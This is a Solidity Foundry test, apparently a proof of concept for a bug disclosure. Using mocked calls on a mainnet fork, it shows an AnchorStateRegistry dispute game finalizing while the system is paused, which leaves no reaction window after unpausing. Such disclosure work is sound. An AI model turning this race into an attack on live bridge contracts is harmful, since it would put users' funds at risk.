// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";

contract CoinbaseRaceProof is Test {
    address constant ASR_ADDR = 0x909f6cf47ed12f010A796527f562bFc26C7F4E72;
    address constant SYS_CONFIG = 0x73a79Fab69143498Ed3712e519A88a918e1f4072;
    address constant FACTORY = 0x43edB88C4B80fDD2AdFF2412A7BebF9dF42cB40e;

    IAnchorStateRegistry asr = IAnchorStateRegistry(ASR_ADDR);
    
    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
    }

    function testAnchorFinalizationRace() public {
        uint256 delay = asr.disputeGameFinalityDelaySeconds();
        
        // Mock a game that resolves at current time
        MockGame game = new MockGame(Timestamp.wrap(uint64(block.timestamp)));
        
        // Mock factory registration
        vm.mockCall(FACTORY, abi.encodeWithSignature("games(uint32,bytes32,bytes)"), abi.encode(address(game), block.timestamp));
        
        console.log("=== STEP 1: INITIAL STATE ===");
        console.log("Finality Delay (Airgap):", delay, "seconds");
        
        // 1. System is paused
        vm.mockCall(SYS_CONFIG, abi.encodeWithSignature("paused()"), abi.encode(true));
        assertTrue(asr.paused(), "System should be paused");
        console.log("[CONFIRMED] System Status: PAUSED (Guardian Intervention)");
        
        // 2. Wait for airgap period to pass
        console.log("Advancing time by delay + 1 second...");
        vm.warp(block.timestamp + delay + 1);
        
        // VULNERABILITY: Game is considered finalized even if it matured while system was paused
        bool finalized = asr.isGameFinalized(IDisputeGame(address(game)));
        assertTrue(finalized, "VULNERABILITY: Game matured while paused!");
        console.log("[CONFIRMED] Game Status: FINALIZED (despite being paused)");
        
        // 3. System is unpaused
        console.log("System Status: UNPAUSED (Guardian lifting pause)");
        vm.mockCall(SYS_CONFIG, abi.encodeWithSignature("paused()"), abi.encode(false));
        
        // 4. Malicious game is now valid immediately
        bool isValid = asr.isGameClaimValid(IDisputeGame(address(game)));
        assertTrue(isValid, "VULNERABILITY: Malicious game is valid IMMEDIATELY");
        console.log("[CONFIRMED] Game Status: VALID & EXECUTABLE (0 seconds reaction window left)");
        
        console.log("\n[SUCCESS] Finalization airgap was consumed during pause.");
    }
}

contract MockGame is IDisputeGame {
    Timestamp public resolvedAtVal;
    constructor(Timestamp _r) { resolvedAtVal = _r; }
    function resolvedAt() external view override returns (Timestamp) { return resolvedAtVal; }
    function status() external pure override returns (GameStatus) { return GameStatus.DEFENDER_WINS; }
    function createdAt() external view override returns (Timestamp) { return Timestamp.wrap(uint64(block.timestamp - 10 days)); }
    function gameType() external pure override returns (GameType) { return GameType.wrap(0); }
    function gameData() external pure override returns (GameType, Claim, bytes memory) { return (GameType.wrap(0), Claim.wrap(bytes32(0)), ""); }
    function wasRespectedGameTypeWhenCreated() external pure returns (bool) { return true; }
    function anchorStateRegistry() external pure returns (address) { return 0x909f6cf47ed12f010A796527f562bFc26C7F4E72; }
    fallback() external {}
}
